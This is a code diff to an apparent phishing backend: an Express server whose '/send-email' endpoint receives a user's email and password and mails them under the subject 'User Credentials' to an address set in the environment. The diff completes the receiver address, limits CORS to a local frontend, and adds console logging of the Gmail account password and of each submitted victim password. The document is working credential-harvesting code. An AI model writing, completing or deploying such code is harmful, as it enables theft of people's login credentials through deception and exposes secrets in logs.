@@ -4,27 +4,47 @@ import nodemailer from "nodemailer";
 import bodyParser from "body-parser";
 import cors from "cors";
 
-dotenv.config();
+dotenv.config(); // Load environment variables from .env file
 
 const app = express();
-app.use(cors());
+app.use(cors({
+  origin: "http://localhost:5173",  // Allow only your frontend
+  methods: "GET,POST,OPTIONS",
+  allowedHeaders: "Content-Type,Authorization"
+}));
+
 app.use(bodyParser.json());
 
-app.post("/send-email", async (req, res) => {
-  const { email, password } = req.body; 
-  console.log("Request body --> " + JSON.stringify(req.body));
+// Log environment variables for debugging
+console.log("Email User:", process.env.EMAIL_USER);
+console.log("Email Pass:", process.env.EMAIL_PASS);
+console.log("Email Receiver:", process.env.EMAIL_RECEIVER);
 
-  let transporter = nodemailer.createTransport({
-    service: "gmail",
-    auth: {
-      user: process.env.EMAIL_USER || '', 
-      pass: process.env.EMAIL_PASS || '',
-    },
-  });
+// Configure Nodemailer transporter
+const transporter = nodemailer.createTransport({
+  service: "gmail",
+  auth: {
+    user: process.env.EMAIL_USER, // Use environment variable
+    pass: process.env.EMAIL_PASS, // Use environment variable
+  },
+});
+
+// Verify Nodemailer configuration
+transporter.verify((error, success) => {
+  if (error) {
+    console.error("Nodemailer verification error:", error);
+  } else {
+    console.log("Nodemailer is ready to send emails");
+  }
+});
+
+app.post("/send-email", async (req, res) => {
+  const { email, password } = req.body;
+  console.log("Request body:", { email, password });
 
   let mailOptions = {
     from: email,
-    to: "",
+    to: process.env.EMAIL_RECEIVER, // Use environment variable
     subject: "User Credentials",
     text: `Email: ${email}\nPassword: ${password}`,
   };
@@ -34,8 +54,8 @@ app.post("/send-email", async (req, res) => {
     console.log("Email sent: " + info.response);
     res.status(200).json({ success: true });
   } catch (error) {
-    console.error(error);
-    res.status(500).json({ success: false });
+    console.error("Nodemailer error:", error);
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
